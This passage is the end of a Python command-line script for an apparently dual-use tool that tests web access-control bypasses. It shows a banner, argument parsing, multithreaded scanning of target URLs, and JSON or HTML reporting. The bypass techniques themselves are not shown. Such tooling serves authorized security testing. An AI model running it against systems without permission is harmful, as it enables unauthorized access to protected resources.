    ║        ║        🐍🐍  Winged Sandals of Swift Passage • Caduceus Staff of Deception  🐍🐍           ║    ║
    ║        ║                                                                                            ║    ║
    ║        ║  "Like Hermes, I find the clever path where others see only barriers..."                  ║    ║
    ║        ║                                                                                            ║    ║
    ║        ╚══════════════════════════════════════════════════════════════════════════════════════════════╝    ║
    ║                                                                                                        ║
    ║  🏛️  HERMES - God of Trickery, Commerce, and Boundary Crossing                                       ║
    ║  🔓 Master of Bypassing Obstacles • Divine Patron of Access Control Testing                           ║
    ║  🎭 12+ Built-in Bypass Techniques + 25+ Custom Assessments                                          ║
    ║  🧠 Intelligent Response Analysis with Confidence Scoring                                             ║
    ║  📈 Comprehensive HTML Reports and JSON Export                                                        ║
    ║  ⚖️  For Authorized Security Testing Only                                                              ║
    ╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
    """
    print(banner)


def main():
    print_banner()
    parser = argparse.ArgumentParser(description='Advanced Access Control Bypass Tester')
    parser.add_argument('-u', '--url', help='Single URL to test')
    parser.add_argument('-f', '--file', help='File containing URLs to test (one per line)')
    parser.add_argument('-c', '--config', help='YAML configuration file')
    parser.add_argument('-d', '--delay', type=float, default=1.0, help='Delay between requests (seconds)')
    parser.add_argument('-t', '--threads', type=int, default=5, help='Number of threads for concurrent testing')
    parser.add_argument('--proxy', help='HTTP proxy (http://proxy:port)')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds')
    parser.add_argument('-o', '--output', help='Output file for results (JSON format)')
    parser.add_argument('--html-report', help='Generate HTML report')
    parser.add_argument('--user-agent', help='Custom User-Agent string')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')

    args = parser.parse_args()

    if not args.url and not args.file:
        parser.error("Either --url or --file must be specified")

    # Load URLs
    urls = []
    if args.url:
        urls = [args.url]
    elif args.file:
        urls = load_urls_from_file(args.file)

    if not urls:
        print("No URLs to test")
        sys.exit(1)

    # Initialize tester
    tester = AccessBypassTester(
        config_file=args.config,
        delay=args.delay,
        user_agent=args.user_agent,
        proxy=args.proxy,
        threads=args.threads,
        timeout=args.timeout
    )

    # Test URLs
    print(f"Starting scan of {len(urls)} URLs with {args.threads} threads...")

    if len(urls) == 1 or args.threads == 1:
        # Single-threaded for single URL or when threads=1
        results = {}
        for url in urls:
            result = tester.test_url(url)
            results[url] = result
            if args.verbose:
                bypass_count = len(result.bypasses_found)
                print(f"[+] {url}: {bypass_count} bypasses found")
    else:
        # Multi-threaded
        results = tester.test_urls_multithreaded(urls)

    # Display summary
    total_bypasses = sum(len(r.bypasses_found) for r in results.values())
    print(f"\n[+] Scan completed!")
    print(f"[+] Total bypasses found: {total_bypasses}")

    # Severity breakdown
    severity_counts = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0, 'info': 0}
    for result in results.values():
        for bypass in result.bypasses_found:
            severity_counts[bypass.severity] += 1

    print("[+] Severity breakdown:")
    for severity, count in severity_counts.items():
        if count > 0:
            print(f"  - {severity.upper()}: {count}")

    # Save results
    if args.output:
        # Convert dataclasses to dicts for JSON serialization
        json_results = {}
        for url, result in results.items():
            json_results[url] = asdict(result)
            json_results[url]['bypasses_found'] = [asdict(b) for b in result.bypasses_found]

        with open(args.output, 'w') as f:
            json.dump(json_results, f, indent=2, default=str)
        print(f"[+] JSON results saved to {args.output}")

    if args.html_report:
        tester.generate_html_report(results, args.html_report)
        print(f"[+] HTML report saved to {args.html_report}")


if __name__ == '__main__':
    main()